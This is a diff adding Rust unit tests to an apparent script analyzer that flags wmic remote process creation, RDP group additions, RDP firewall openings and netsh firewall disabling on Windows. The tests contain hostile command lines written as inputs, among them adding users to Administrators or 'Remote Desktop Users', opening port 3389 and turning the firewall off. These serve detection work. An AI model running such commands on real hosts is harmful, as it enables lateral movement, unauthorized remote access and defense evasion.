@@ -14211,6 +14211,37 @@ mod wmic_tests {
     }
 
     #[test]
+    fn wmic_node_process_call_create_extracts_inner() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wmic /node:"target.example" process call create "cmd /c echo remote""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::WmicProcessCreate { inner_cmd } if inner_cmd == "cmd /c echo remote"
+            )),
+            "no WmicProcessCreate with /node: {:?}",
+            env.traits
+        );
+        assert!(
+            env.exec_cmd.iter().any(|c| c == "cmd /c echo remote"),
+            "no recursive remote cmd: {:?}",
+            env.exec_cmd
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::LateralMovement { tool, target_host }
+                    if tool == "wmic" && target_host == "target.example"
+            )),
+            "no wmic lateral movement trait for /node target: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wmic_process_call_create_accepts_spaced_node_target() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -14240,6 +14271,28 @@ mod wmic_tests {
     }
 
     #[test]
+    fn wmic_process_call_create_tolerates_spacing_and_case() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "WMIC   /NODE:target.example   PROCESS   CALL   CREATE   \"cmd /c echo spaced\"",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::WmicProcessCreate { inner_cmd } if inner_cmd == "cmd /c echo spaced"
+            )),
+            "spacing/case variant did not emit WmicProcessCreate: {:?}",
+            env.traits
+        );
+        assert!(
+            env.exec_cmd.iter().any(|c| c == "cmd /c echo spaced"),
+            "spacing/case variant did not recurse: {:?}",
+            env.exec_cmd
+        );
+    }
+
+    #[test]
     fn wmic_path_win32_process_call_create_extracts_inner() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -14253,6 +14306,28 @@ mod wmic_tests {
         });
         assert!(has, "no path WmicProcessCreate: {:?}", env.traits);
         assert_eq!(env.exec_cmd, vec!["cmd /c echo hi".to_string()]);
+    }
+
+    #[test]
+    fn wmic_process_call_create_ignores_current_directory_argument() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wmic process call create "cmd /c echo payload", "C:\Users\Public""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::WmicProcessCreate { inner_cmd } if inner_cmd == "cmd /c echo payload"
+            )),
+            "current-directory argument was not stripped from WMIC child: {:?}",
+            env.traits
+        );
+        assert!(
+            env.exec_cmd.iter().any(|c| c == "cmd /c echo payload"),
+            "current-directory argument leaked into recursive cmd: {:?}",
+            env.exec_cmd
+        );
     }
 
     #[test]
@@ -25969,6 +26044,24 @@ C:\Users\Public\nt.tmp localgroup Administrators backdoor /ADD
     }
 
     #[test]
+    fn copied_net_alias_remote_desktop_users_group_add_emits_remote_access() {
+        let script = br#"copy C:\Windows\System32\net.exe C:\Users\Public\nt.tmp
+C:\Users\Public\nt.tmp localgroup "Remote Desktop Users" support /add
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-user-group-add" && target == "support"
+            )),
+            "missing copied-net Remote Desktop Users remote access trait: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_robocopy_alias_preserves_generated_script_content_for_later_execution() {
         let report = analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29waWVkLXJvYm9jb3B5LmV4YW1wbGUvcGF5bG9hZCc=")) > C:\Work\original.js
@@ -26099,6 +26192,105 @@ C:\Users\Public\ns.tmp advfirewall set allprofiles state off
                     if action == "netsh-fw-off" && target == "allprofiles"
             )),
             "copied netsh firewall disable was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn netsh_remote_desktop_firewall_group_enable_emits_remote_access_trait() {
+        let script =
+            br#"netsh advfirewall firewall set rule group="remote desktop" new enable=yes"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "Remote Desktop"
+            )),
+            "missing Remote Desktop firewall group enablement: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn netsh_remote_desktop_firewall_group_enable_any_order_emits_remote_access_trait() {
+        let script =
+            br#"netsh advfirewall firewall set rule new enable=yes group="remote desktop""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "Remote Desktop"
+            )),
+            "netsh Remote Desktop group enable with reordered args was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn netsh_rdp_firewall_allow_any_argument_order_emits_remote_access_trait() {
+        let script =
+            br#"netsh advfirewall firewall add rule name=rdp action=allow protocol=TCP localport=3389 dir=in"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "3389"
+            )),
+            "netsh RDP firewall allow with reordered args was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn legacy_netsh_rdp_portopening_emits_remote_access_trait() {
+        let script = br#"netsh firewall add portopening TCP 3389 "Remote Desktop" ENABLE"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-firewall-open" && target == "3389"
+            )),
+            "legacy netsh RDP port opening was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn netsh_legacy_firewall_disable_emits_defender_evasion_trait() {
+        let script = br#"netsh firewall set opmode disable"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "netsh-fw-off" && target == "legacy-firewall"
+            )),
+            "legacy netsh firewall disable was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn netsh_legacy_firewall_mode_disable_emits_defender_evasion_trait() {
+        let script = br#"netsh firewall set opmode mode=disable"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "netsh-fw-off" && target == "legacy-firewall"
+            )),
+            "legacy netsh firewall mode=disable was not surfaced: {:?}",
             report.traits
         );
     }
